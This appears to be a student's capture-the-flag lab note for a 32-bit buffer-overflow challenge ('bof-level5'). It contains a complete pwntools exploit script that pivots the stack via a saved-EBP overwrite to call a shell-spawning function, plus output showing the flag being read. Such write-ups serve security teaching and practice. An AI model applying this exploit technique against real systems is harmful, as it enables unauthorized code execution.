Notes:

```
python3 tmp.py
[+] Starting local process './bof-level5': pid 1112043
[*] '/home/sawyeras/week2/bof-level5/bof-level5'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
gas addr:  0x80491b6
[*] Switching to interactive mode
Now the program contains a buffer overflow vulnerability,
but the vulnerability does not allow us to overwrite the return address...
Can you exploit this program?
Spawning a privileged shell
$ cat flag
cand{l3avE_p0pS_EBP}
```

```py
from pwn import *

p = process('./bof-level5')

context.terminal = ['tmux', 'splitw', '-h']

#gdb.attach(p, '''
'''
set follow-fork-mode child
break execve
break *0x0804923d
continue
'''#)

e = ELF('./bof-level5')
get_a_shell = e.symbols['get_a_shell']
print("gas addr: ", hex(get_a_shell))
                                                                                                                                                                                                      '''
buf = b'a' * 0x84                                                                                                                                                                                     c = Core('./core.1077027')

buffer_addr = c.stack.find(buf)
print("buffer addr: ", hex(buffer_addr))
'''
buffer_addr = 0xffffc488

string = b'aaaa' + p32(get_a_shell) + b'a' * 120 + p32(buffer_addr)

p.sendline(string)

p.interactive()
```

Had to do the cp and run with bof-levelx to get the right offset. I kept getting 0xffffd478 with the core and stuff, weird. 
